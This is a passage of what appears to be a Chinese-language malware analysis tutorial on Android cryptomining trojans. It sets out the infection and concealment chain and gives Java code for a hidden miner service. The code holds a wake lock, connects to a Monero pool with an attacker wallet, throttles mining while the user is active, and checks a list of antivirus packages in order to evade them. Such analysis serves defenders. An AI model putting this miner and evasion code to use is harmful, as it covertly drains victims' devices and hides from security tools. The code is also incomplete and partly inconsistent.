# 挖矿木马分析

### 8.1 挖矿木马行为特征

```
Android 挖矿木马行为链：

1. 投递阶段
   ├── 隐藏在游戏/壁纸/系统工具应用中
   ├── 通过第三方应用商店传播
   └── 部分通过恶意广告网络下载

2. 激活阶段
   ├── 后台启动 Service（无界面）
   ├── 申请 WAKE_LOCK 权限（防止 CPU 休眠）
   ├── 检测设备充电状态（在充电时更积极挖矿）
   └── 检测电池温度（过热时降低算力）

3. 挖矿阶段
   ├── 加载 Native 挖矿库（libminer.so）
   ├── 连接到矿池（stratum+tcp://pool.xxx:3333）
   ├── 使用设备 CPU/GPU 进行哈希计算
   ├── 提交计算结果到矿池
   └── 隐匿行为（检测前台应用时暂停挖矿）

4. 隐匿阶段
   ├── 伪装为系统服务进程名
   ├── 检测安全应用时停止运行
   ├── 禁用省电模式
   └── 修改电池优化设置
```

### 8.2 挖矿木马代码分析

```java
// Android 挖矿木马核心逻辑

// 1. 隐蔽挖矿 Service
public class HiddenMinerService extends Service {
    private PowerManager.WakeLock wakeLock;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 获取 WAKE_LOCK 防止 CPU 休眠
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MinerWakeLock");
        wakeLock.acquire();

        // 检测充电状态
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING;

        if (isCharging) {
            // 充电时全速挖矿
            startMining(100); // 100% CPU
        } else {
            // 未充电时降低算力（减少发热）
            startMining(30); // 30% CPU
        }

        return START_STICKY; // 保持运行
    }

    // 2. 加载 Native 挖矿库
    private void startMining(int intensity) {
        System.loadLibrary("miner"); // 加载 libminer.so

        // 配置矿池连接
        String poolUrl = "stratum+tcp://xmr.pool.minergate.com:45560";
        String wallet = "41234567890abcdef..."; // 攻击者的钱包地址

        // 调用 Native 挖矿函数
        nativeStartMining(poolUrl, wallet, intensity);
    }

    // Native 方法声明
    private native void nativeStartMining(String poolUrl, String wallet, int intensity);
    private native void nativeStopMining();
}

// 3. 隐匿行为
public class MiningCloak {
    // 检测前台应用，在用户使用时暂停挖矿
    public void monitorForeground(Context context) {
        UsageStatsManager usm = (UsageStatsManager)
            context.getSystemService(Context.USAGE_STATS_SERVICE);

        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                long time = System.currentTimeMillis();
                List<UsageStats> stats = usm.queryUsageStats(
                    UsageStatsManager.INTERVAL_BEST, time - 5000, time);

                if (!stats.isEmpty()) {
                    String topApp = stats.get(stats.size() - 1).getPackageName();
                    // 如果用户在使用设备，降低算力或暂停
                    if (!topApp.equals(getPackageName())) {
                        nativeSetIntensity(10); // 降低到 10%
                    }
                }
            }
        }, 0, 5000); // 每5秒检查一次
    }

    // 检测安全应用
    public boolean isSecurityAppRunning(Context context) {
        String[] securityPackages = {
            "com.android.antivirus",
            "com.qihoo.security",
            "com.tencent.mobile.antivirus",
            "com.cleanmaster.mguard"
        };

        ActivityManager am = (ActivityManager)
            context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo process : processes) {
            for (String pkg : securityPackages) {
                if (process.processName.contains(pkg)) {
                    return true; // 检测到安全应用
                }
            }
        }
        return false;
    }
}
```
